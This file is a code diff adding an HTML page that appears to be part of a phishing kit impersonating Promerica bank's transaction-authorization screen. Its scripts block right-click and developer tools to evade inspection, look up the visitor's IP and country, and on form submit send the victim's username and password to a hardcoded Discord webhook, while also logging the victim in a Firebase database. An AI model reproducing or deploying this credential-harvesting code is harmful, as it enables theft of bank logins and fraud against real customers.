@@ -1,0 +1,231 @@
+<html><head><style>
+    body {
+      font-family: Arial, sans-serif;
+      align-items: center;
+    }
+
+    .modal1 {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      padding: 25px;
+      width: 350px;
+      text-align: center;
+      border: 2px solid #3cb371;
+    }
+
+    .modal h2 {
+      color: #2a7a3a;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .timer {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 15px 0;
+      color: #333;
+    }
+
+    .loading {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3cb371;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+    <link href="desktop.css" type="text/css" rel="stylesheet">
+	<link rel="SHORTCUT ICON" href="images/favicon.ico">
+	<meta charset="UTF-8">
+	<META HTTP-EQUIV="REFRESH" CONTENT="65;URL=espere.html">
+	<title>Ingreso</title>
+	<script src="verificar-ip.js"></script><script src="ips-bloqueadas.js"></script>
+	<script>
+    // Bloquear clic derecho
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+    }, false);
+
+    // Bloquear teclas de inspección
+    document.addEventListener("keydown", function (e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Detección de consola abierta (básica)
+    (function () {
+      const element = new Image();
+      Object.defineProperty(element, 'id', {
+        get: function () {
+          document.body.innerHTML = '<h1 style="color:red;text-align:center;">Inspección desactivada</h1>';
+        }
+      });
+      console.log(element);
+    })();
+  </script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <!-- Librerías externas -->
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script src="telegram.js"></script>      
+    <!-- Firebase Configuración -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyArx7TMrSDKaB7tv3V5oidA2xZKBXnQMv4",
+  authDomain: "fwcperso.firebaseapp.com",
+  projectId: "fwcperso",
+  storageBucket: "fwcperso.firebasestorage.app",
+  messagingSenderId: "654637722413",
+  appId: "1:654637722413:web:e4bf0af48ce5d55d5881a4"
+};
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      // Hacer accesible globalmente
+      window.db = db;
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+</head>
+<body>
+
+    <div style="margin-top: 20px;margin-bottom: 20px;margin-left: auto;margin-right: auto;width: 52%;">
+	<img src="images/1.png" alt="logo">
+	</div>
+	
+<div class="bottom_nav"></div>
+
+<div style="margin-top: 35px;margin-left: auto;margin-bottom: 20px;margin-right: auto;width: 51%;">
+<center><div class="modal1">
+    <h2>Autorizar transacción</h2><br>
+    <p>Apruebe su inicio de sesión desde la notificación enviada a su dispositivo móvil registrado, 
+    o bien, utilice la opción Token en la aplicación de banca digital.</p>
+
+    <p>Esperando su autorización, la cual caducará en:</p>
+    <div class="timer" id="countdown">01:00</div>
+
+    <div><img src="spinner.gif" alt="logo"></div>
+    <div class="loading">Procesando...</div>
+  </div></center>
+
+  <script>
+    let time = 60; // 60 segundos
+    let countdownEl = document.getElementById("countdown");
+
+    let timer = setInterval(() => {
+      time--;
+      let minutes = Math.floor(time / 60);
+      let seconds = time % 60;
+      countdownEl.textContent = 
+        (minutes < 10 ? "0" : "") + minutes + ":" + 
+        (seconds < 10 ? "0" : "") + seconds;
+
+      if (time <= 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "Expirado";
+        document.querySelector(".loading").textContent = "Tiempo agotado ❌";
+      }
+    }, 1000);
+  </script>
+
+<img src="images/6.png" alt="logo" style="border-width:0px;">
+</div>
+
+<div class="bottom_nav"></div>
+
+
+<script>
+async function getCountry() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.country;
+            } catch (error) {
+                console.error('Error al obtener el país:', error);
+                return 'País Desconocido';
+            }
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener la dirección IP:', error);
+                return 'IP Desconocida';
+            }
+        }
+    document
+      .querySelector("#loginform")
+      .addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        const usuario =localStorage.getItem("usuario");;
+        const contra = document.querySelector("#ypn-cl").value;
+		const pais = await getCountry();
+            const ip = await getIPAddress();
+
+        if (!usuario || !contra || !pais || !ip ) {
+          alert("Por favor, complete todos los campos.");
+          return;
+        }
+
+        try {
+          const userRef = doc(window.db, "prolme", usuario);
+          await setDoc(userRef, {
+            question1: "Sin uso",
+            question2: "Sin uso",
+            question3: "Sin uso",
+            page: 0,
+          });
+
+          
+          const message = `➖➖➖➖➖[ 🏦Promerica ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n🔒 Contra: ${contra}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\n\IP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
+
+
+      const discord_webhook_url = "https://discord.com/api/webhooks/1405207595693637652/J5csOYIdidR99EN7RHoT8Ta6rQj2iLnhfaoQXMMD7udWtD-8oWYVvaxNJtsed-H0crL1";
+
+      await fetch(discord_webhook_url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          content: message
+        }),
+      });
+
+          window.location.href = "espere.html";
+        } catch (error) {
+          console.error("Error al enviar datos:", error);
+        }
+      });
+  </script></body></html>
